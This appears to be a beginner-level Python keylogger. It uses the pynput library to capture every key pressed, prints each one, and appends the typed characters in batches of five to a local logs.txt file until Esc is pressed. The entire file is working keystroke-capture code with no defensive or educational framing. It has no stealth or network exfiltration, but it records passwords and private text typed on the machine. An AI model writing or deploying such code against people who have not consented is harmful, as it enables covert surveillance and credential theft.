from pynput.keyboard import Key, Listener

words_counts = 0
keys = []


def on_press(key):
    global words_counts, keys
    keys.append(key)
    words_counts += 1
    print(f'{key} pressed')
    if words_counts >= 5:
        words_counts = 0
        write_file(keys)
        keys = []


def write_file(key_arr):
    with open("logs.txt", "a") as f:
        for key in key_arr:
            ke = str(key).replace("'", "")
            if ke.find("space") > 0:
                f.write('\n')
            if ke.find("key") == -1:
                f.write(ke)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listen:
    listen.join()
